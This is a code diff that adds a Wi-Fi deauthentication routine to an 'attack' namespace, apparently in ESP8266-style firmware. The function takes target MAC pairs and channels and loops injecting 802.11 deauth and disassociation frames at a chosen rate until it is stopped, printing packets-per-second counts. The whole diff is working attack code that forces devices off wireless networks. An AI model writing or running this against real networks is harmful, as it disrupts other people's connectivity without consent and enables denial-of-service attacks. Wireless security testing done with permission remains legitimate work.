@@ -72,4 +72,89 @@ namespace attack {
         }
         debugln("Finished ");
     }
+
+    void deauth(TargetList& targets, bool deauth, bool disassoc, unsigned long rate, unsigned long timeout, unsigned long pkts) {
+        // Output
+        if (deauth && disassoc) {
+            debug("Deauthing and disassociating ");
+        } else if (deauth) {
+            debug("Deauthing ");
+        } else if (disassoc) {
+            debug("Disassociating ");
+        }
+
+        debug(targets.size());
+        debugln(" targets:");
+
+        // Print MACs
+        targets.begin();
+
+        while (targets.available()) {
+            Target t = targets.iterate();
+            debug("- From ");
+            debug(strh::mac(t.from()));
+            debug(" to ");
+            debug(strh::mac(t.to()));
+            debug(" on channel ");
+            debugln(t.ch());
+        }
+
+        debug("With ");
+        debug(rate);
+        debugln(" packets per second");
+
+        if (timeout > 0) {
+            debug("Stop after ");
+            debug(timeout/1000);
+            debugln(" seconds");
+        }
+
+        if (pkts > 0) {
+            debug("Stop after ");
+            debug(pkts);
+            debugln(" packets");
+        }
+
+        debugln("Type 'stop' or 'exit' to stop the attack");
+
+        unsigned long start_time  = millis();
+        unsigned long output_time = millis();
+
+        unsigned long pkts_sent       = 0;
+        unsigned long pkts_per_second = 0;
+        unsigned long pkt_time        = 0;
+        unsigned long pkt_interval    = (1000/rate) * (deauth+disassoc);
+
+        bool running = true;
+
+        while (running) {
+            targets.begin();
+
+            while (running && targets.available()) {
+                if (millis() - pkt_time >= pkt_interval) {
+                    Target t = targets.iterate();
+
+                    if (deauth) pkts_per_second += packetinjector::deauth(t.ch(), t.from(), t.to());
+                    if (disassoc) pkts_per_second += packetinjector::disassoc(t.ch(), t.from(), t.to());
+
+                    pkt_time = millis();
+                }
+                if (millis() - output_time >= 1000) {
+                    pkts_sent += pkts_per_second;
+
+                    debug(pkts_per_second);
+                    debug(" pkts/s, ");
+                    debug(pkts_sent);
+                    debugln(" sent");
+
+                    output_time = millis();
+
+                    pkts_per_second = 0;
+                }
+                running = !(cli::read_exit()
+                            || (timeout > 0 && millis() - start_time > timeout)
+                            || (pkts > 0 && pkts_sent > pkts));
+            }
+        }
+    }
 }
